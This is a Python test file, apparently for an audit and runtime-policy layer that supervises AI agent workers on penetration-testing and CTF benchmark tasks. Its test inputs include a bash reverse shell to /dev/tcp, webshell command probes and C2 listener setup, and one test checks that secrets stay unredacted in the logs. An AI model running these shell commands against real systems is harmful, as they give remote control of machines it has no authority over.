from __future__ import annotations

import json
from pathlib import Path

from redtrace.dispatcher.audit import (
    AuditPublisher,
    _enrich_tool_event,
    _skill_name_from_event,
    normalize_event,
)
from redtrace.dispatcher.config import WorkerConfig
from redtrace.dispatcher.protocol.client import ApiResult
from redtrace.dispatcher.runtime.process import ProcessResult
from redtrace.dispatcher.runtime.stream_buffer import TRUNCATED_STREAM_LINE


class RecordingClient:
    def __init__(self) -> None:
        self.batches: list[tuple[dict, list[dict]]] = []
        self.webshells: list[dict] = []
        self.peers: list[dict[str, str]] = []
        self.snapshot = ApiResult(
            200,
            {"audit_cursor": 0, "counts": {}, "resources": []},
        )

    def append_audit_events(self, run: dict, events: list[dict]) -> None:
        self.batches.append((dict(run), [dict(event) for event in events]))

    def snapshot_resources(self, project_id: str, **fields) -> ApiResult:
        return self.snapshot

    def active_peer_work(self, project_id: str, worker: str) -> list[dict[str, str]]:
        return self.peers

    def ensure_webshell_resource(self, project_id: str, **fields) -> ApiResult:
        self.webshells.append({"project_id": project_id, **fields})
        return ApiResult(201, {"resource": {"id": "ws_auto"}})


def _worker(worker_type: str = "pi") -> WorkerConfig:
    return WorkerConfig.model_validate(
        {
            "name": f"{worker_type}-1",
            "type": worker_type,
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )


def test_preloaded_skill_is_audited_without_queue_eviction(tmp_path: Path) -> None:
    client = RecordingClient()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "REDTRACE_PRIMARY_SKILL=pentest-tools",
    )
    assert publisher._queue.maxsize == 0
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = [event for _, batch in client.batches for event in batch]
    assert [
        event["kind"]
        for event in events
        if event.get("skill_name") == "pentest-tools"
    ] == ["skill.started", "skill.completed"]

    failed = RecordingClient()
    publisher = AuditPublisher(
        failed,
        "proj_001",
        "i002",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "REDTRACE_PRIMARY_SKILL=pentest-tools",
    )
    publisher.finish(ProcessResult(returncode=1, stdout="", stderr="failed"))
    publisher.close()

    failed_events = [event for _, batch in failed.batches for event in batch]
    assert [
        event["kind"]
        for event in failed_events
        if event.get("skill_name") == "pentest-tools"
    ] == ["skill.started"]


def test_runtime_policy_allows_lifecycle_and_blocks_active_peer_challenge(
    tmp_path: Path,
) -> None:
    class Process:
        reason = ""

        def cancel(self, reason: str) -> None:
            self.reason = reason

    client = RecordingClient()
    process = Process()
    bootstrap = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "bootstrap",
        str(tmp_path),
        "prompt",
    )
    bootstrap.attach_process(process)
    bootstrap._enforce_command("curl -X POST http://bench/challenges/e1-02/start")
    bootstrap.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    bootstrap.close()

    assert process.reason == ""

    allowed_process = Process()
    allowed = AuditPublisher(
        RecordingClient(),
        "proj_001",
        "i002",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "## Current Intent Description\n```\n启动e1-02（单题）\n```",
    )
    allowed.attach_process(allowed_process)
    allowed._enforce_command(
        "curl -X POST 'http://bench/challenges/start?unique_code=e1-02' "
        "-H 'BENCHMARK_TOKEN: test-token'"
    )
    assert allowed_process.reason == ""
    allowed.close()

    blocked_process = Process()
    blocked_client = RecordingClient()
    blocked_client.peers = [
        {"intent_id": "i009", "worker": "pi-2", "description": "解决 a-05"}
    ]
    blocked = AuditPublisher(
        blocked_client,
        "proj_001",
        "i003",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "## Current Intent Description\n```\n启动e1-02（单题）\n```",
    )
    blocked.attach_process(blocked_process)
    blocked._enforce_command("curl -X POST http://bench/challenges/a-05/close")
    assert "another Worker: a-05" in blocked_process.reason
    blocked.close()


def test_runtime_policy_requires_snapshot_and_managed_c2(tmp_path: Path) -> None:
    class Process:
        reasons: list[str] = []

        def cancel(self, reason: str) -> None:
            self.reasons.append(reason)

    client = RecordingClient()
    client.snapshot = ApiResult(503)
    process = Process()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher.attach_process(process)
    publisher._enforce_command("bash -i >& /dev/tcp/10.0.0.2/4444 0>&1")
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert process.reasons == [
        "snapshot shared access resources before establishing a remote shell"
    ]


def test_runtime_policy_accepts_snapshot_listener_and_payload_flow(tmp_path: Path) -> None:
    client = RecordingClient()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher._enforce_command("redtrace-resource snapshot --kind c2_session")
    publisher._enforce_command("redtrace-resource listener-create --name primary --bind-port 4444")
    publisher._record_command_success(
        {
            "command": "redtrace-resource listener-create --name primary --bind-port 4444",
            "exit_code": 0,
        }
    )
    publisher._enforce_command("bash -i >& /dev/tcp/10.0.0.2/4444 0>&1")
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert publisher._policy_cancelled is False


def test_runtime_policy_requires_changes_before_duplicate_channel(tmp_path: Path) -> None:
    class Process:
        reason = ""

        def cancel(self, reason: str) -> None:
            self.reason = reason

    client = RecordingClient()
    process = Process()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher.attach_process(process)
    publisher._enforce_command("redtrace-resource snapshot --kind c2_listener")
    create = "redtrace-resource listener-create --name one --bind-port 4444"
    publisher._enforce_command(create)
    publisher._record_command_success({"command": create, "exit_code": 0})
    publisher._enforce_command(
        "redtrace-resource listener-create --name two --bind-port 5555"
    )
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert process.reason == "refresh resource changes before creating another access channel"


def test_successful_direct_webshell_command_is_registered(tmp_path: Path) -> None:
    client = RecordingClient()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher._register_webshell_candidate(
        {
            "command": "curl 'https://target.test/ws.php?cmd=id'",
            "exit_code": 0,
            "error": False,
            "content": "uid=33(www-data) gid=33(www-data)",
        }
    )
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert client.webshells == [
        {
            "project_id": "proj_001",
            "target": "https://target.test/ws.php",
            "command_param": "cmd",
            "method": "GET",
            "worker": "pi-1",
            "intent_id": "i001",
        }
    ]


def test_ordinary_news_php_is_not_registered_as_webshell(tmp_path: Path) -> None:
    client = RecordingClient()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher._register_webshell_candidate(
        {
            "command": "curl 'https://target.test/news.php?id=1'",
            "exit_code": 0,
            "error": False,
        }
    )
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert client.webshells == []


def test_webshell_attempt_without_command_proof_is_not_registered(tmp_path: Path) -> None:
    client = RecordingClient()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher._register_webshell_candidate(
        {
            "command": "curl --fail 'https://target.test/download.php?id=log&cmd=id'",
            "exit_code": 0,
            "error": False,
            "content": "(no output)",
        }
    )
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert client.webshells == []


def test_snapshot_preflight_forces_registered_webshell_through_manager(
    tmp_path: Path,
) -> None:
    class Process:
        reason = ""

        def cancel(self, reason: str) -> None:
            self.reason = reason

    client = RecordingClient()
    client.snapshot = ApiResult(
        200,
        {
            "resources": [
                {
                    "kind": "webshell",
                    "target": "https://target.test/ws.php",
                    "metadata": {"command_param": "cmd", "method": "GET"},
                }
            ]
        },
    )
    process = Process()
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        _worker(),
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher.attach_process(process)
    publisher._enforce_command("curl 'https://target.test/ws.php?cmd=id'")
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    assert process.reason == "this WebShell is registered; execute it through redtrace-resource run"


def test_normalize_provider_events() -> None:
    claude = normalize_event(
        "claudecode",
        json.dumps(
            {
                "type": "stream_event",
                "event": {
                    "type": "content_block_delta",
                    "delta": {"type": "text_delta", "text": "hello"},
                },
            }
        ),
    )
    codex = normalize_event(
        "codex",
        json.dumps(
            {
                "type": "item.completed",
                "item": {"id": "m1", "type": "agent_message", "text": "done"},
            }
        ),
    )
    pi = normalize_event(
        "pi",
        json.dumps(
            {
                "type": "message_update",
                "assistantMessageEvent": {"type": "text_delta", "delta": "hi"},
            }
        ),
    )

    assert [(event["kind"], event["content"]) for event in claude + codex + pi] == [
        ("assistant.delta", "hello"),
        ("assistant.message", "done"),
        ("assistant.delta", "hi"),
    ]


def test_codex_command_display_is_compact_and_repairs_mojibake() -> None:
    mojibake = "笛卡".encode("utf-8").decode("latin-1")

    events = normalize_event(
        "codex",
        json.dumps(
            {
                "type": "item.completed",
                "item": {
                    "id": "cmd-1",
                    "type": "command_execution",
                    "command": (
                        r'"C:\\Program Files\\PowerShell\\7\\pwsh.exe" '
                        r'-Command "Write-Output \"中文\""'
                    ),
                    "aggregated_output": mojibake,
                    "exit_code": 0,
                },
            },
        ),
    )

    assert events == [
        {
            "kind": "command.completed",
            "timestamp": events[0]["timestamp"],
            "title": "Shell",
            "call_id": "cmd-1",
            "command": 'Write-Output "中文"',
            "content": "笛卡",
            "exit_code": 0,
        }
    ]


def test_claude_streamed_tool_arguments_become_a_command_event(tmp_path: Path) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "claude-1",
            "type": "claudecode",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    lines = [
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_start",
                "index": 0,
                "content_block": {"type": "tool_use", "id": "tool-1", "name": "Bash"},
            },
        },
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_delta",
                "index": 0,
                "delta": {
                    "type": "input_json_delta",
                    "partial_json": '{"command":"echo 中文"}',
                },
            },
        },
        {
            "type": "stream_event",
            "event": {"type": "content_block_stop", "index": 0},
        },
    ]

    for line in lines:
        publisher.handle_output("stdout", json.dumps(line, ensure_ascii=False))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = [event for _, batch in client.batches for event in batch]
    commands = [
        (event["kind"], event.get("title"), event.get("command"))
        for event in events
        if event["kind"].startswith("command.")
    ]
    assert commands == [
        ("command.started", "Shell", "echo 中文")
    ]


def test_pi_shell_tool_events_match_codex_command_shape(tmp_path: Path) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "pi-1",
            "type": "pi",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher.handle_output(
        "stdout",
        json.dumps(
            {
                "type": "tool_execution_start",
                "toolName": "bash",
                "toolCallId": "pi-1",
                "args": {"command": "echo 中文"},
            },
            ensure_ascii=False,
        ),
    )
    publisher.handle_output(
        "stdout",
        json.dumps(
            {
                "type": "tool_execution_end",
                "toolName": "bash",
                "toolCallId": "pi-1",
                "result": "中文",
                "isError": False,
            },
            ensure_ascii=False,
        ),
    )
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = [event for _, batch in client.batches for event in batch]
    started = next(event for event in events if event["kind"] == "command.started")
    completed = next(event for event in events if event["kind"] == "command.completed")
    assert started["title"] == completed["title"] == "Shell"
    assert started["command"] == completed["command"] == "echo 中文"
    assert completed["content"] == "中文"


def test_claude_skill_event_keeps_only_the_skill_name(
    tmp_path: Path, monkeypatch
) -> None:
    monkeypatch.setenv("REDTRACE_CAPABILITIES_ROOT", str(tmp_path))
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "claude-1",
            "type": "claudecode",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    for payload in (
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_start",
                "index": 0,
                "content_block": {
                    "type": "tool_use",
                    "id": "skill-1",
                    "name": "Skill",
                },
            },
        },
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_delta",
                "index": 0,
                "delta": {
                    "type": "input_json_delta",
                    "partial_json": '{"skill":"route-skills"}',
                },
            },
        },
        {
            "type": "stream_event",
            "event": {"type": "content_block_stop", "index": 0},
        },
        {
            "type": "user",
            "message": {
                "content": [
                    {
                        "type": "tool_result",
                        "tool_use_id": "skill-1",
                        "content": "secret skill instructions",
                    }
                ]
            },
        },
    ):
        publisher.handle_output("stdout", json.dumps(payload))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    skill_events = [
        event
        for _, batch in client.batches
        for event in batch
        if event["kind"].startswith("skill.")
    ]
    assert [event["kind"] for event in skill_events] == [
        "skill.started",
        "skill.completed",
    ]
    assert all(event["skill_name"] == "route-skills" for event in skill_events)
    assert all("arguments" not in event for event in skill_events)
    assert all("content" not in event for event in skill_events)


def test_codex_skill_read_command_keeps_only_the_skill_name(
    tmp_path: Path, monkeypatch
) -> None:
    monkeypatch.setenv("REDTRACE_CAPABILITIES_ROOT", str(tmp_path))
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "codex-1",
            "type": "codex",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    command = "rtk read /workspace/.codex/skills/route-skills/SKILL.md"
    for payload in (
        {
            "type": "item.started",
            "item": {
                "id": "skill-1",
                "type": "command_execution",
                "command": command,
            },
        },
        {
            "type": "item.completed",
            "item": {
                "id": "skill-1",
                "type": "command_execution",
                "command": command,
                "aggregated_output": "secret skill instructions",
                "exit_code": 0,
            },
        },
    ):
        publisher.handle_output("stdout", json.dumps(payload))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    skill_events = [
        event
        for _, batch in client.batches
        for event in batch
        if event["kind"].startswith("skill.")
    ]
    assert [event["kind"] for event in skill_events] == [
        "skill.started",
        "skill.completed",
    ]
    assert all(event["skill_name"] == "route-skills" for event in skill_events)
    assert all("command" not in event for event in skill_events)
    assert all("content" not in event for event in skill_events)


def test_pi_skill_read_keeps_only_the_skill_name(
    tmp_path: Path, monkeypatch
) -> None:
    monkeypatch.setenv("REDTRACE_CAPABILITIES_ROOT", str(tmp_path))
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "pi-1",
            "type": "pi",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    for payload in (
        {
            "type": "tool_execution_start",
            "toolName": "read",
            "toolCallId": "skill-1",
            "args": {
                "path": "/workspace/.agents/skills/route-skills/SKILL.md"
            },
        },
        {
            "type": "tool_execution_end",
            "toolName": "read",
            "toolCallId": "skill-1",
            "result": "secret skill instructions",
            "isError": False,
        },
    ):
        publisher.handle_output("stdout", json.dumps(payload))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    skill_events = [
        event
        for _, batch in client.batches
        for event in batch
        if event["kind"].startswith("skill.")
    ]
    assert [event["kind"] for event in skill_events] == [
        "skill.started",
        "skill.completed",
    ]
    assert all(event["skill_name"] == "route-skills" for event in skill_events)
    assert all("arguments" not in event for event in skill_events)
    assert all("content" not in event for event in skill_events)


def test_nested_skill_path_overrides_reported_route_skills_name(
    tmp_path: Path,
) -> None:
    skill_dir = tmp_path / "upstream" / "skills" / "ida-reverse"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(
        "---\nname: ida-reverse\ndescription: Reverse binaries.\n---\n\n# IDA\n",
        encoding="utf-8",
    )
    event = {
        "kind": "tool.started",
        "title": "Read",
        "skill_name": "route-skills",
        "arguments": {"file_path": str(skill_dir / "SKILL.md")},
    }
    assert _skill_name_from_event(event) == "ida-reverse"

    # Without file access the SKILL.md directory name is the fallback, still
    # ahead of the router package name reported by the Agent.
    missing = {
        "kind": "tool.started",
        "title": "Read",
        "skill_name": "route-skills",
        "arguments": {
            "path": "/workspace/route-skills/upstream/skills/other-tool/SKILL.md"
        },
    }
    assert _skill_name_from_event(missing) == "other-tool"


def test_skill_completed_keeps_started_concrete_name_via_call_id() -> None:
    active: dict[str, dict] = {}
    started = {
        "kind": "tool.started",
        "title": "Read",
        "call_id": "call-1",
        "arguments": {
            "path": "/workspace/route-skills/upstream/skills/ida-reverse/SKILL.md"
        },
    }
    enriched = _enrich_tool_event(started, active)
    assert enriched["kind"] == "skill.started"
    assert enriched["skill_name"] == "ida-reverse"

    active["call-1"] = enriched
    completed = {"kind": "tool.completed", "call_id": "call-1", "content": "secret"}
    done = _enrich_tool_event(completed, active)
    assert done["kind"] == "skill.completed"
    assert done["skill_name"] == "ida-reverse"
    assert "content" not in done


def test_plain_markdown_reads_are_not_skills() -> None:
    for path in (
        "/workspace/route-skills/README.md",
        "/workspace/route-skills/references/reference.md",
    ):
        event = {
            "kind": "tool.started",
            "title": "Read",
            "arguments": {"file_path": path},
        }
        assert _skill_name_from_event(event) == ""
        assert _enrich_tool_event(dict(event), {})["kind"] == "tool.started"


def test_pi_router_load_is_hidden_and_nested_skill_is_shown(
    tmp_path: Path, monkeypatch
) -> None:
    monkeypatch.setenv("REDTRACE_CAPABILITIES_ROOT", str(tmp_path))
    router_dir = tmp_path / "skills" / "route-skills"
    router_dir.mkdir(parents=True)
    (router_dir / "SKILL.md").write_text(
        "---\n"
        "name: route-skills\n"
        "description: Route to nested skills.\n"
        "metadata:\n"
        "  router: true\n"
        "---\n",
        encoding="utf-8",
    )
    ida_dir = router_dir / "upstream" / "skills" / "ida-reverse"
    ida_dir.mkdir(parents=True)
    (ida_dir / "SKILL.md").write_text(
        "---\nname: ida-reverse\ndescription: |\n  Reverse binaries.\n---\n",
        encoding="utf-8",
    )

    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "pi-1",
            "type": "pi",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    for payload in (
        {
            "type": "tool_execution_start",
            "toolName": "Skill",
            "toolCallId": "router-1",
            "args": {"skill": "route-skills"},
        },
        {
            "type": "tool_execution_end",
            "toolName": "Skill",
            "toolCallId": "router-1",
            "result": "router instructions",
            "isError": False,
        },
        {
            "type": "tool_execution_start",
            "toolName": "read",
            "toolCallId": "ida-1",
            "args": {"path": str(ida_dir / "SKILL.md")},
        },
        {
            "type": "tool_execution_end",
            "toolName": "read",
            "toolCallId": "ida-1",
            "result": "secret nested instructions",
            "isError": False,
        },
    ):
        publisher.handle_output("stdout", json.dumps(payload, ensure_ascii=False))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = _events_of(client)
    skill_events = [event for event in events if event["kind"].startswith("skill.")]
    # Only the concrete nested Skill is logged; the router load stays a plain
    # tool event and never shows as "Skill route-skills".
    assert [
        (event["kind"], event["skill_name"]) for event in skill_events
    ] == [
        ("skill.started", "ida-reverse"),
        ("skill.completed", "ida-reverse"),
    ]
    assert all("content" not in event for event in skill_events)
    router_events = [
        event for event in events if event.get("call_id") == "router-1"
    ]
    assert [event["kind"] for event in router_events] == [
        "tool.started",
        "tool.completed",
    ]
    assert all(event.get("skill_name") != "route-skills" for event in events)


def test_skill_plugin_prefix_is_stripped_from_tool_arguments() -> None:
    event = {
        "kind": "tool.started",
        "title": "Skill",
        "arguments": {"skill": "redtrace-capabilities:pentest-tools"},
    }
    assert _skill_name_from_event(event) == "pentest-tools"


def test_provider_tool_outputs_are_not_truncated_at_32_kib() -> None:
    content = "完整输出" * (12 * 1024)
    cases = [
        (
            "claudecode",
            {
                "type": "user",
                "message": {
                    "content": [
                        {
                            "type": "tool_result",
                            "tool_use_id": "tool-1",
                            "content": content,
                        }
                    ]
                },
            },
        ),
        (
            "codex",
            {
                "type": "item.completed",
                "item": {
                    "id": "tool-1",
                    "type": "mcp_tool_call",
                    "tool": "example",
                    "result": content,
                    "status": "completed",
                },
            },
        ),
        (
            "pi",
            {
                "type": "tool_execution_end",
                "toolName": "example",
                "toolCallId": "tool-1",
                "result": content,
                "isError": False,
            },
        ),
    ]

    for provider, payload in cases:
        events = normalize_event(provider, json.dumps(payload, ensure_ascii=False))
        assert events[0]["content"] == content
        assert "output truncated for audit UI" not in events[0]["content"]


def test_static_audit_command_expands_without_ellipsis() -> None:
    static_dir = Path(__file__).parents[1] / "src" / "redtrace" / "server" / "static"
    index = (static_dir / "index.html").read_text(encoding="utf-8")
    styles = (static_dir / "audit.css").read_text(encoding="utf-8")

    assert "audit-command-text min-w-0 flex-1" in index
    assert ".audit-command-text" in styles
    assert ".audit-terminal[open] .audit-command-text" in styles
    assert "white-space: pre-wrap" in styles


def test_static_audit_hides_claude_skill_plugin_namespace() -> None:
    static_dir = Path(__file__).parents[1] / "src" / "redtrace" / "server" / "static"
    index = (static_dir / "index.html").read_text(encoding="utf-8")
    audit = (static_dir / "audit.js").read_text(encoding="utf-8")

    assert 'x-text="displaySkillName(event)"' in index
    assert "replace(/^redtrace-capabilities:/, '')" in audit
    assert "/static/audit.js?v=20260808-thinking-collapse" in index


def test_successful_worker_stderr_is_not_rendered_as_worker_error(
    tmp_path: Path,
) -> None:
    cases = (
        (
            "codex",
            "Reading additional input from stdin...\nERROR codex_core::tools::router",
        ),
        (
            "pi",
            "added 94 packages, and audited 95 packages in 13s\n"
            "found 0 vulnerabilities",
        ),
    )

    for provider, stderr in cases:
        client = RecordingClient()
        worker = WorkerConfig.model_validate(
            {
                "name": f"{provider}-1",
                "type": provider,
                "task_types": ["explore"],
                "max_running": 1,
                "priority": 0,
                "env": {},
            }
        )
        publisher = AuditPublisher(
            client,
            "proj_001",
            "i001",
            worker,
            "explore_execute",
            str(tmp_path),
            "prompt",
        )
        publisher.finish(ProcessResult(returncode=0, stdout="", stderr=stderr))
        publisher.close()

        events = [event for _, batch in client.batches for event in batch]
        assert not any(event["kind"] in {"stderr", "error"} for event in events)


def test_failed_worker_stderr_is_preserved_as_error(tmp_path: Path) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "pi-1",
            "type": "pi",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    publisher.finish(
        ProcessResult(returncode=1, stdout="", stderr="npm ERR! install failed")
    )
    publisher.close()

    events = [event for _, batch in client.batches for event in batch]
    errors = [event for event in events if event["kind"] == "error"]
    assert [event["content"] for event in errors] == ["npm ERR! install failed"]


def test_audit_publisher_batches_unredacted_run_events(tmp_path: Path) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "codex-1",
            "type": "codex",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "API_KEY=do-not-log",
    )
    publisher.handle_output(
        "stdout",
        json.dumps(
            {
                "type": "item.completed",
                "item": {
                    "id": "m1",
                    "type": "mcp_tool_call",
                    "tool": "example",
                    "arguments": {"token": "abc123"},
                    "result": "authorization: bearer-secret",
                    "status": "completed",
                },
            }
        ),
    )
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = [event for _, batch in client.batches for event in batch]
    serialized = json.dumps(events)
    assert {"run.started", "user.message", "tool.completed", "run.completed"} <= {
        event["kind"] for event in events
    }
    assert "do-not-log" in serialized
    assert "bearer-secret" in serialized
    assert "[REDACTED]" not in serialized


def test_audit_publisher_flushes_large_assistant_text_in_bounded_chunks(
    tmp_path: Path,
) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "claude-1",
            "type": "claudecode",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    content = "a" * (40 * 1024)
    publisher.handle_output(
        "stdout",
        json.dumps(
            {
                "type": "stream_event",
                "event": {
                    "type": "content_block_delta",
                    "delta": {"type": "text_delta", "text": content},
                },
            }
        ),
    )
    publisher.handle_output("stdout", TRUNCATED_STREAM_LINE)
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    messages = [
        event
        for _, batch in client.batches
        for event in batch
        if event["kind"] == "assistant.message" and event.get("persist_only")
    ]
    assert len(messages) == 2
    assert all(len(event["content"]) <= 32 * 1024 for event in messages)
    assert "".join(event["content"] for event in messages) == content
    assert any(
        event["kind"] == "output.truncated"
        for _, batch in client.batches
        for event in batch
    )


def _events_of(client: "RecordingClient") -> list[dict]:
    return [event for _, batch in client.batches for event in batch]


def test_claude_thinking_blocks_become_thinking_events(tmp_path: Path) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "claude-1",
            "type": "claudecode",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    payloads = [
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_start",
                "index": 0,
                "content_block": {"type": "thinking", "thinking": ""},
            },
        },
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "thinking_delta", "thinking": "Let me "},
            },
        },
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "thinking_delta", "thinking": "analyze this."},
            },
        },
        {
            "type": "stream_event",
            "event": {
                "type": "content_block_delta",
                "index": 0,
                "delta": {"type": "signature_delta", "signature": "sig"},
            },
        },
        {
            "type": "stream_event",
            "event": {"type": "content_block_stop", "index": 0},
        },
    ]
    for payload in payloads:
        publisher.handle_output("stdout", json.dumps(payload, ensure_ascii=False))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = _events_of(client)
    deltas = [event for event in events if event["kind"] == "thinking.delta"]
    assert [event["content"] for event in deltas] == ["Let me ", "analyze this."]
    messages = [
        event
        for event in events
        if event["kind"] == "thinking.message" and event.get("persist_only")
    ]
    assert [event["content"] for event in messages] == ["Let me analyze this."]
    # The completion marker is a flush signal, never displayed or persisted.
    completed = [event for event in events if event["kind"] == "thinking.completed"]
    assert len(completed) == 1
    assert "content" not in completed[0]


def test_codex_reasoning_summary_becomes_thinking_message() -> None:
    events = normalize_event(
        "codex",
        json.dumps(
            {
                "type": "item.completed",
                "item": {
                    "id": "rs-1",
                    "type": "reasoning",
                    "summary": [
                        {"type": "summary_text", "text": "Step one."},
                        {"type": "summary_text", "text": "Step two."},
                    ],
                    "encrypted_content": "opaque",
                },
            }
        ),
    )

    assert events == [
        {
            "kind": "thinking.message",
            "timestamp": events[0]["timestamp"],
            "role": "assistant",
            "content": "Step one.\n\nStep two.",
            "message_id": "rs-1",
        }
    ]


def test_codex_reasoning_without_summary_is_ignored() -> None:
    events = normalize_event(
        "codex",
        json.dumps(
            {
                "type": "item.completed",
                "item": {"id": "rs-2", "type": "reasoning", "summary": []},
            }
        ),
    )
    assert events == []


def test_pi_streamed_thinking_flushes_a_single_message(tmp_path: Path) -> None:
    client = RecordingClient()
    worker = WorkerConfig.model_validate(
        {
            "name": "pi-1",
            "type": "pi",
            "task_types": ["explore"],
            "max_running": 1,
            "priority": 0,
            "env": {},
        }
    )
    publisher = AuditPublisher(
        client,
        "proj_001",
        "i001",
        worker,
        "explore_execute",
        str(tmp_path),
        "prompt",
    )
    for payload in (
        {
            "type": "message_update",
            "assistantMessageEvent": {
                "type": "thinking_delta",
                "delta": "考虑",
            },
        },
        {
            "type": "message_update",
            "assistantMessageEvent": {
                "type": "thinking_delta",
                "delta": "一下。",
            },
        },
        {
            "type": "message_update",
            "assistantMessageEvent": {
                "type": "thinking_end",
                "content": "考虑一下。",
            },
        },
    ):
        publisher.handle_output("stdout", json.dumps(payload, ensure_ascii=False))
    publisher.finish(ProcessResult(returncode=0, stdout="", stderr=""))
    publisher.close()

    events = _events_of(client)
    deltas = [event for event in events if event["kind"] == "thinking.delta"]
    assert [event["content"] for event in deltas] == ["考虑", "一下。"]
    messages = [
        event
        for event in events
        if event["kind"] == "thinking.message" and event.get("persist_only")
    ]
    assert [event["content"] for event in messages] == ["考虑一下。"]


